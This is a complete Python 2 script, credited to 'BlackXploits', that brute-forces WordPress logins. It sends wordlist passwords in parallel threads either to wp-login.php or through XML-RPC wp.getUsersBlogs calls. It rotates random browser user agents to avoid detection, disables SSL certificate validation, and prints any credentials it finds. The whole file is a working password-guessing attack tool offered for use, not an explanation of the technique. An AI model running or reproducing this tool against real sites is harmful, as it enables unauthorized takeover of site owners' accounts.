#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: BlackXploits
# Special thank's to: stamparm (Miroslav Stampar)
# PLEASE DON'T DELETE THIS COPYRGHT
# --------------------------------------------

import urllib
import urllib2
import httplib
import httplib2
import time
import socket, sys, os, os.path, argparse, random
from threading import Thread
from time import sleep

w  = '\033[0m'
r  = '\033[31m'
y  = '\033[93m'
g  = '\033[32m'
b  = '\033[34m'

os.system('clear')

def randomAgentGen():

 userAgent =    ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
                'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
                'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
                'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']

 UA = random.choice(userAgent)
 return UA

banner = """
 __      ____________         __________                __          
/  \    /  \______   \        \______   \______ __ ___ /  |_  ____  
\   \/\/   /|     ___/   ______ |    |  _|_  __ \  |  \   __\/ __ \ 
 \        / |    |      /_____/ |    |   \|  | \/  |  /|  | \  __ / 
  \__/\  /  |____|              |______  /|__|  |____/ |__|  \___  >
       \/                               \/                       \/

                    Author: BlackXploits
                     Telegram: @BlackXploits
"""

def urlCMS(url,brutemode):
    if url[:8] != "https://" and url[:7] != "http://":
        print(g+'\n[*]'+w+' You must insert http:// or https:// procotol')
        os._exit(1)
    # Login Page WordPress
    if brutemode == "std":
       url = url+'/wp-login.php'
    else:
       url = url+'/xmlrpc.php'
    return url

def bodyCMS(username,pwd,brutemode):
    if brutemode == "std":
       body = { 'log':username,
       'pwd':pwd,
       'wp-submit':'Login',
       'testcookie':'1' }
    else:
       body = """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName>
         <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, pwd)
    return body


def headersCMS(UA,lenbody,brutemode):
    if brutemode == "std":
       headers = { 'User-Agent': UA,
                   'Content-type': 'application/x-www-form-urlencoded',
                   'Cookie': 'wordpress_test_cookie=WP+Cookie+check' }
    else:
       headers = { 'User-Agent': UA,
                   'Content-type': 'text/xml',
                   'Content-Length': "%d" % len(lenbody)}
    return headers

def responseCMS(response):
    if response['set-cookie'].split(" ")[-1] == "httponly":
        return "1"

def connection(url,user,password,UA,timeout,brutemode):

    username = user
    pwd = password

    http = httplib2.Http(timeout=timeout, disable_ssl_certificate_validation=True)

    # HTTP POST Data
    body = bodyCMS(username,pwd,brutemode)

    # Headers
    headers = headersCMS(UA,body,brutemode)

    try:

        if brutemode == "std":
           response, content = http.request(url, 'POST', headers=headers, body=urllib.urlencode(body))

           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
              print(r+'[!] HTTP error, code: '+w+str(response.status))
              os._exit(1)

           if responseCMS(response) == "1":
              print('\n')
              print(g+'[*]'+w+' Password FOUND !')
              print('')
              print('[!] Username: '+user+' Password: '+password)
              os._exit(0)

           checkCon = "OK"
           return checkCon
        else:
           response, content = http.request(url, 'POST', headers=headers, body=body)

           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
              print(r+'[!] HTTP error, code: '+str(response.status))
              os._exit(1)

           # Menghapus semua karakter kosong & baris baru
           xmlcontent = content.replace(" ", "").replace("\n","")

           if not "faultCode" in xmlcontent:
              print('\n')
              print(g+'[*]'+w+' Password FOUND!')
              print('')
              print('[!] Username: '+user+' Password: '+password)
              os._exit(0)

           checkCon = "OK"
           return checkCon

    except socket.timeout:
         print(r+'\n\n[!]'+w+' Connection Timeout')
         os._exit(1)
    except socket.error:
         print(r+'\n[!]'+w+' Connection Refused')
         os._exit(1)
    except httplib.ResponseNotReady:
        print(r+'\n[!]'+w+' Server Not Responding')
        os._exit(1)
    except httplib2.ServerNotFoundError:
        print(r+'\n[!]'+w+' Server Not Found')
        os._exit(1)
    except httplib2.HttpLib2Error:
        print(r+'\n[!] Connection Error !')
        os._exit(1)


def blocks(files, size=65536):
    while True:
        b = files.read(size)
        if not b: break
        yield b

commandList = argparse.ArgumentParser(sys.argv[0])
commandList.add_argument('-s', '--standard',
                  action="store_true",
                  dest="standard",
                  help="Standard login brute",
                  )
commandList.add_argument('-x', '--xml-rpc',
                  action="store_true",
                  dest="xml",
                  help="Xml-rpc login brute",
                  )
commandList.add_argument('-t', '--target',
                  action="store",
		  dest="target",
                  help="Insert URL: http://www.site.com",
                  )
commandList.add_argument('-u', '--username',
                  action="store",
                  dest="username",
                  help="Insert username",
                  )
commandList.add_argument('-w', '--wordlist',
                  action="store",
                  dest="wordlist",
                  help="Insert wordlist file",
                  )
commandList.add_argument('--timeout',
                  action="store",
                  dest="timeout",
                  default=10,
                  type=int,
                  help="Timeout Value)",
                  )

options = commandList.parse_args()

# Cek mode bruteforce conflict
if options.standard and options.xml:
   print (y+"\n[*] Select standard [-S]"+w+"OR"+y+"xml-rpc [-X] bruteforce mode")
   sys.exit(1)

# Check argument
if not options.standard and not options.xml:
    print(banner)
    print
    commandList.print_help()
    sys.exit(1)
elif not options.target or not options.username or not options.wordlist:
    print(banner)
    print
    commandList.print_help()
    sys.exit(1)

# Set bruteforce mode
if options.standard:
   brtmd="std"
else:
   brtmd="xml"

url = options.target
user = options.username
wlfile = options.wordlist
timeout = options.timeout

# Memeriksa file Wordlist
if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
    print (r+"[*]"+w+" Wordlist file is missing or is not readable")
    sys.exit(1)

# Gen Random UserAgent
UA  = randomAgentGen()
# Url to url+login_cms_page
url = urlCMS(url,brtmd)

wlsize = os.path.getsize(wlfile) >>20
if wlsize < 100:
    with open(wlfile) as f:
        totalwordlist = sum(bl.count("\n") for bl in blocks(f))
else:
    totalwordlist="unknown"

print(banner)
print
print(y+'[*] Target           : '+w+options.target)
print(y+'[*] Username         : '+w+user)
print(y+'[*] Wordlist Total   : '+w+str(totalwordlist))
if brtmd == "std":
   print(y+'[*] Bruteforce Mode  :'+w+' Standard')
else:
   print(y+'[*] Bruteforce Mode  :'+w+' xml-rpc')
print(b+'\n\n[*]'+w+' Connecting . . .')

# Check koneksi dengan fake-login
if connection(url,user,UA,UA,timeout,brtmd) == "OK":
   print(g+'[*]'+w+' Successfully Connected')

# Reset var untuk "progress bar"
count = 0

threads = []

with open(wlfile) as wordlist:
	for pwd in wordlist:
	    count += 1
	    t = Thread(target=connection, args=(url,user,pwd,UA,timeout,brtmd))
	    t.start()
	    threads.append(t)
	    sys.stdout.write('\r')
	    sys.stdout.write(g+'[*]'+w+' Bruteforce Running : '+str(count)+'/'+str(totalwordlist))
	    sys.stdout.flush()
	    sleep(0.210)

for a in threads:
    a.join()
# Password tidak ditemukan
print(r+'\n[!]'+w+' Password NOT found !')
